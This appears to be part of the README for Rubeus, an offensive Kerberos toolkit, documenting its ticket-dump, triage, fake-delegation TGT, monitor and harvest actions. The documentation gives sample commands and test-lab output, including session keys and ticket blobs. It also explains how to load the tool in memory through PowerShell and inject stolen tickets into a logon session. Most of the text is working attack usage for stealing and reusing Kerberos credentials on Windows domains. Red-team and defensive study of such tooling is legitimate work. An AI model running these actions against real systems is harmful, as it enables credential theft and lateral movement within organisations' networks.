    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 169 bytes
    [*] Received 1437 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:

        $krb5asrep$TestOU3user@testlab.local:6AC7726...(snip)...

    ...(snip)...


## dump

The **dump** action will extract current TGTs and service tickets from memory, if in an elevated context. If not elevated, tickets for the current user are extracted. The resulting extracted tickets can be filtered by /service (use /service:krbtgt for TGTs) and/or logon ID (the /luid:X parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the ptt function, or Mimikatz's **kerberos::ptt** functionality.

    c:\Temp\tickets>Rubeus.exe dump /service:krbtgt /luid:366300

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0


    [*] Action: Dump Kerberos Ticket Data (All Users)

    [*] Target LUID     : 0x596f6
    [*] Target service  : krbtgt


      UserName                 : harmj0y
      Domain                   : TESTLAB
      LogonId                  : 366326
      UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111
      AuthenticationPackage    : Kerberos
      LogonType                : Interactive
      LogonTime                : 9/17/2018 9:05:26 AM
      LogonServer              : PRIMARY
      LogonServerDNSDomain     : TESTLAB.LOCAL
      UserPrincipalName        : harmj0y@testlab.local

        [*] Enumerated 1 ticket(s):

        ServiceName              : krbtgt
        TargetName               : krbtgt
        ClientName               : harmj0y
        DomainName               : TESTLAB.LOCAL
        TargetDomainName         : TESTLAB.LOCAL
        AltTargetDomainName      : TESTLAB.LOCAL
        SessionKeyType           : aes256_cts_hmac_sha1
        Base64SessionKey         : AdI7UObh5qHL0Ey+n28oQpLUhfmgbAkpvcWJXPC2qKY=
        KeyExpirationTime        : 12/31/1600 4:00:00 PM
        TicketFlags              : name_canonicalize, pre_authent, initial, renewable, forwardable
        StartTime                : 9/17/2018 4:20:25 PM
        EndTime                  : 9/17/2018 9:20:25 PM
        RenewUntil               : 9/24/2018 2:05:26 AM
        TimeSkew                 : 0
        EncodedTicketSize        : 1338
        Base64EncodedTicket      :

          doIFNjCCBTKgAwIBBaEDAg...(snip)...


    [*] Enumerated 4 total tickets
    [*] Extracted  1 total tickets

**Note that this action needs to be run from an elevated context to extract usable TGTs!**


## klist

The **klist** action will list current logon sessions and associated ticket information, if in an elevated context. If not elevated, information on the current user's tickets is displayed.

Logon and ticket information can be displayed for a specific LogonID with /LUID:X

    C:\Temp>Rubeus.exe klist

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.3.0



    [*] Action: List Kerberos Tickets (All Users)


    UserName                 : dfm.a
    Domain                   : TESTLAB
    LogonId                  : 1915357
    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1110
    AuthenticationPackage    : Kerberos
    LogonType                : Interactive
    LogonTime                : 2/5/2019 8:05:32 PM
    LogonServer              : PRIMARY
    LogonServerDNSDomain     : TESTLAB.LOCAL
    UserPrincipalName        : dfm.a@testlab.local

        [0] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/5/2019 12:05:32 PM ; 2/5/2019 5:05:32 PM ; 2/12/2019 12:05:32 PM
        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL
        Client Name       : dfm.a @ TESTLAB.LOCAL
        Flags             : name_canonicalize, initial, renewable, forwardable (40c10000)


        ...(snip)...


## triage

The **triage** action will all current tickets on the system, if elevated. Tickets can be triage for specific LoginIDs (/luid:X), users (/user:USER), or services (/service:LDAP).

    C:\Temp>Rubeus.exe triage

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/


    v1.3.3



    [*] Action: Triage Kerberos Tickets

    ---------------------------------------------------------------------------------------------------------
    | LUID    | UserName                   | Service                                  | EndTime             |
    ---------------------------------------------------------------------------------------------------------
    | 0x4420e | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/7/2019 1:51:35 PM |
    | 0x4420e | harmj0y @ TESTLAB.LOCAL    | LDAP/PRIMARY.testlab.local/testlab.local | 2/7/2019 1:51:35 PM |
    | 0x441d8 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/7/2019 1:51:35 PM |
    | 0x441d8 | harmj0y @ TESTLAB.LOCAL    | LDAP/PRIMARY.testlab.local/testlab.local | 2/7/2019 1:51:35 PM |
    | 0x3e4   | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/7/2019 1:51:31 PM |
    | 0x3e4   | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/7/2019 1:51:31 PM |
    | 0x3e4   | windows10$ @ TESTLAB.LOCAL | cifs/PRIMARY.testlab.local               | 2/7/2019 1:51:31 PM |
    | 0x3e4   | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/7/2019 1:51:31 PM |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/7/2019 1:51:30 PM |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/7/2019 1:51:30 PM |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | LDAP/PRIMARY.testlab.local               | 2/7/2019 1:51:30 PM |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | cifs/PRIMARY.testlab.local/testlab.local | 2/7/2019 1:51:30 PM |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | WINDOWS10$                               | 2/7/2019 1:51:30 PM |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/7/2019 1:51:30 PM |
    ---------------------------------------------------------------------------------------------------------


    C:\Temp>Rubeus.exe triage /service:LDAP

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/


    v1.3.3



    [*] Action: Triage Kerberos Tickets

    [*] Target service  : LDAP

    ---------------------------------------------------------------------------------------------------------
    | LUID    | UserName                   | Service                                  | EndTime             |
    ---------------------------------------------------------------------------------------------------------
    | 0x4420e | harmj0y @ TESTLAB.LOCAL    | LDAP/PRIMARY.testlab.local/testlab.local | 2/7/2019 1:51:35 PM |
    | 0x441d8 | harmj0y @ TESTLAB.LOCAL    | LDAP/PRIMARY.testlab.local/testlab.local | 2/7/2019 1:51:35 PM |
    | 0x3e4   | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/7/2019 1:51:31 PM |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | LDAP/PRIMARY.testlab.local               | 2/7/2019 1:51:30 PM |
    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/7/2019 1:51:30 PM |
    ---------------------------------------------------------------------------------------------------------


## tgtdeleg

The **tgtdeleg** using [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) trick (**tgt::deleg**) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user's Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.

    C:\Rubeus>Rubeus.exe tgtdeleg

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.1.0


    [*] Action: Request Fake Delegation TGT (current user)

    [*] No target SPN specified, attempting to build 'HOST/dc.domain.com'
    [*] Initializing Kerberos GSS-API w/ fake delegation for target 'HOST/PRIMARY.testlab.local'
    [+] Kerberos GSS-API initialization success!
    [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
    [*] Found the AP-REQ delegation ticket in the GSS-API output.
    [*] Authenticator etype: aes256_cts_hmac_sha1
    [*] Extracted the service ticket session key from the ticket cache: PrrVTn8MgR52epjaG5YnvZMAeCn1TnJn8QfuMh9lvw8=
    [+] Successfully decrypted the authenticator
    [*] base64(ticket.kirbi):

          doIFNjCCBTKgAwIBBaE...(snip)...


## monitor

The **monitor** action will monitor the event log for 4624 logon events and will extract any new TGT tickets for the new logon IDs (LUIDs). The /interval parameter (in seconds, default of 60) specifies how often to check the event log. A /filteruser:X can be specified, returning only ticket data for said user. This function is especially useful on servers with unconstrained delegation enabled ;)

When the /filteruser (or if not specified, any user) creates a new 4624 logon event, any extracted TGT KRB-CRED data is output.

Further, if you wish to save the output to the registry, pass the /registry flag and specfiy a path under HKLM to create (i.e., `/registry:SOFTWARE\MONITOR`). Then you can remove this entry after you've finished running Rubeus by `Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force`.

    c:\Rubeus>Rubeus.exe monitor /filteruser:dfm.a

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.0.0

    [*] Action: TGT Monitoring
    [*] Monitoring every 60 seconds for 4624 logon events
    [*] Target user : dfm.a


    [+] 9/17/2018 7:59:02 PM - 4624 logon event for 'TESTLAB.LOCAL\dfm.a' from '192.168.52.100'
    [*] Target LUID     : 0x991972
    [*] Target service  : krbtgt

      UserName                 : dfm.a
      Domain                   : TESTLAB
      LogonId                  : 10033522
      UserSID                  : S-1-5-21-883232822-274137685-4173207997-1110
      AuthenticationPackage    : Kerberos
      LogonType                : Network
      LogonTime                : 9/18/2018 2:59:02 AM
      LogonServer              :
      LogonServerDNSDomain     : TESTLAB.LOCAL
      UserPrincipalName        :

        ServiceName              : krbtgt
        TargetName               :
        ClientName               : dfm.a
        DomainName               : TESTLAB.LOCAL
        TargetDomainName         : TESTLAB.LOCAL
        AltTargetDomainName      : TESTLAB.LOCAL
        SessionKeyType           : aes256_cts_hmac_sha1
        Base64SessionKey         : orxXJZ/r7zbDvo2JUyFfi+2ygcZpxH8e6phGUT5zDbc=
        KeyExpirationTime        : 12/31/1600 4:00:00 PM
        TicketFlags              : name_canonicalize, renewable, forwarded, forwardable
        StartTime                : 9/17/2018 7:59:02 PM
        EndTime                  : 9/18/2018 12:58:59 AM
        RenewUntil               : 9/24/2018 7:58:59 PM
        TimeSkew                 : 0
        EncodedTicketSize        : 1470
        Base64EncodedTicket      :

          doIFujCCBbagAwIBBaE...(snip)...


    [*] Extracted  1 total tickets

**Note that this action needs to be run from an elevated context!**


## harvest

The **harvest** action takes monitor one step further. It monitors the event log for 4624 events every /interval:MINUTES for new logons, extracts any new TGT KRB-CRED files, and keeps a cache of any extracted TGTs. On the /interval, any TGTs that will expire before the next interval are automatically renewed (up until their renewal limit), and the current cache of "usable"/valid TGT KRB-CRED .kirbis are output as base64 blobs.

This allows you to harvest usable TGTs from a system without opening up a read handle to LSASS, though elevated rights are needed to extract the tickets.

Further, you can pass the /registry flag to save the tickets into the registry for later extraction, such as `/registry:SOFTWARE\HARVEST`. You can remove the registry save data by `Get-Item HKLM:\SOFTWARE\HARVEST\ | Remove-Item -Recurse -Force`.

    c:\Rubeus>Rubeus.exe harvest /interval:30

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v0.0.1a

    [*] Action: TGT Harvesting (w/ auto-renewal)

    [*] Monitoring every 30 minutes for 4624 logon events

    ...(snip)...

    [*] Renewing TGT for dfm.a@TESTLAB.LOCAL
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1520 bytes
    [*] Received 1549 bytes

    [*] 9/17/2018 6:43:02 AM - Current usable TGTs:

    User                  :  dfm.a@TESTLAB.LOCAL
    StartTime             :  9/17/2018 6:43:02 AM
    EndTime               :  9/17/2018 11:43:02 AM
    RenewTill             :  9/24/2018 2:07:48 AM
    Flags                 :  name_canonicalize, renewable, forwarded, forwardable
    Base64EncodedTicket   :

        doIFujCCBbagAw...(snip)...

**Note that this action needs to be run from an elevated context!**


## Compile Instructions

We are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)

Rubeus has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.


### Sidenote: Building Rubeus as a Library

To build Rubeus as a library, under **Project** -> **Rubeus Properties** -> change **Output type** to **Class Library**. Compile, and add the Rubeus.dll as a reference to whatever project you want. Rubeus functionality can then be invoked as in a number of ways:


    // pass the Main method the arguments you want
    Rubeus.Program.Main("dump /luid:3050142".Split());

    // or invoke specific functionality manually
    Rubeus.LSA.ListKerberosTicketDataAllUsers(new Rubeus.Interop.LUID());


You can then use [ILMerge](https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630) to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.


### Sidenote: Running Rubeus Through PowerShell

If you want to run Rubeus in-memory through a PowerShell wrapper, first compile the Rubeus and base64-encode the resulting assembly:

    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt

Rubeus can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded Rubeus assembly string):

    $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))

The Main() method and any arguments can then be invoked as follows:

    [Rubeus.Program]::Main("dump /luid:3050142".Split())

Or individual functions can be invoked:

    $KerbTicket = 'do...' # base64-encoded ticket.kirbi
    $TicketBytes = [convert]::FromBase64String($KerbTicket)
    $LogonID = [Rubeus.LSA]::CreateProcessNetOnly("mmc.exe", $false)
    [Rubeus.LSA]::ImportTicket($TicketBytes, $LogonID)
